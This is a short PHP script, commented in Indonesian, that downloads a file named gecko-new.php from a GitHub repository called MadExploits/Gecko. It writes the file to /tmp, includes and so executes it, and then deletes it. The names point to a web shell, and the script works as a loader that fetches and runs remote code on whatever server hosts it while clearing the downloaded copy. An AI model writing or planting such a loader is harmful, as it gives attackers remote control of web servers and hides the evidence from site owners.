<?php
// Mengambil dan menyimpan kode PHP dari URL
$link = 'https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko-new.php';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $link);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$output = curl_exec($ch);
curl_close($ch);

// Menyimpan file sementara
$temp_file = '/tmp/gecko-new.php';
file_put_contents($temp_file, $output);

// Pastikan file disimpan dengan benar dan aman sebelum di-include
if (file_exists($temp_file)) {
    include $temp_file;  // Menyertakan file PHP yang telah diunduh
} else {
    echo 'File tidak ditemukan atau gagal disimpan.';
}

// Menghapus file sementara setelah digunakan
unlink($temp_file);
?>
